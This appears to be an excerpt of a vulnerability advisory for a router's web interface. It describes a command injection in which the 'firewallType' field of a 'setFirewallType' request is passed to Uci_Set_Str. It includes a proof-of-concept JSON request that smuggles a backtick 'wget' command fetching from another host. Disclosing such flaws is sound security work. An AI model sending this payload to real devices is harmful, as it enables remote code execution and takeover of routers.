...
In sub_42DA2C function, it reads in a user-provided parameter `firewallType` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `firewallType` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setFirewallType","firewallType":"`wget 192.168.6.1:7777/testpoc`"
}
```
